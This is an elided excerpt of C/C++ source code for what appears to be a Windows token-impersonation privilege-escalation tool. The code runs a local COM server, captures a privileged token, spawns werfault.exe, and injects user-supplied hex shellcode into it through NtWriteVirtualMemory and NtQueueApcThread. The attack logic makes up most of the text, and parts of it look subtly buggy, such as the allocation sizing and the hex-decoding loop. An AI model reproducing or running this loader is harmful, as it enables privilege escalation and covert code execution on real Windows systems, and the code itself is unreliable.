...
void usage()
{
	...
	printf("Mandatory args: \n"
		"-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both (default t)\n"
		"-p <program>: program to launch (default werfault.exe)\n"
		"-l <port>: COM server listen port (default 2333)\n"
	);

	printf("\n\n");
	printf("Optional args: \n"
		"-m <ip>: COM server listen address (default 127.0.0.1)\n"
		"-s <shellcode>: hex shellcode to loader (default NULL)\n"
...
int wmain(int argc, wchar_t** argv)
{
	...
	if (processname == NULL)
		processname = L"C:\\Windows\\System32\\werfault.exe";
		...
		if (test->negotiator->authResult != -1)
		{
			...
			if (*processtype == 't' || *processtype == '*')
			{
				...
				else
				{
					...
					int iSize;
					char *char_shellcode;
					iSize = WideCharToMultiByte(CP_ACP, 0, shellcode, -1, NULL, 0, NULL, NULL); //iSize =wcslen(pwsUnicode)+1=6
					char_shellcode = (char*)malloc(iSize * sizeof(char)); //不需要 pszMultiByte = (char*)malloc(iSize*sizeof(char)+1);
					WideCharToMultiByte(CP_ACP, 0, shellcode, -1, char_shellcode, iSize, NULL, NULL);

					unsigned int char_in_hex;
					unsigned int iterations = strlen(char_shellcode);


					unsigned int memory_allocation = strlen(char_shellcode) / 2;


					for (unsigned int i = 0; i< iterations - 1; i++) {
						sscanf(char_shellcode + 2 * i, "%2X", &char_in_hex);
						char_shellcode[i] = (char)char_in_hex;
					}
					...
					printf("[+] setup for NTAPI functions\n");
					...
					SIZE_T allocation_size = sizeof(char_shellcode);
					allocation_start = nullptr;

					printf("[+] Allocation Memory and Write shellcode to the allocated buffer\n");
					...
					fNtWriteVirtualMemory(pi.hProcess, allocation_start, char_shellcode, memory_allocation, 0);
					
					printf("[+] Inject into the suspended thread\n");
					fNtQueueApcThread(hThread, (PIO_APC_ROUTINE)allocation_start, allocation_start, NULL, NULL);
					
					printf("[+] Resume the suspended thread\n");
